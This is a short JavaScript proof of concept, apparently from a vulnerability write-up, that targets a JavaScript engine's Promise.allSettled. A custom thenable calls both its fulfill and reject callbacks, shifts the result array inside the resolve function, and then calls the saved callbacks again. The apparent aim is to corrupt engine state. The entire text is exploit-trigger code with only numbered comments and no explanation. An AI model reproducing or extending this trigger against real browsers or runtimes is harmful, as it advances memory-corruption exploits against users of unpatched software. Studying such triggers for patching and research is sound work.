
class CustomPromise { // [1]
    constructor(executor) {
        executor(custom_resolve, custom_reject);
    }
    static resolve() { // [4]
        return { 
            then: (fulfill, reject) => {
                if(count != 0){
                    fulfill();
                    reject();
                    count--;
                } else {
                    last_fulfilled = fulfill; // [5]
                    last_reject = reject;     // [6]
                }
                
            }
        };
    }
}

function custom_resolve(result) { // [2]
    for (let i = 0; i < 12; i++) {
        result.shift();
    }
}

function custom_reject(result) { } // [3]

count = 11;
function last_fulfilled() {};
function last_reject() {};

const arr = Array(count+1); // [7]
for (let i  = 0; i < count+1; i++) {
    arr[i] = 0x40+i;
}

Reflect.apply(Promise.allSettled, CustomPromise, [arr]); // [8]

last_fulfilled(); // [9]
last_reject(); // [10]
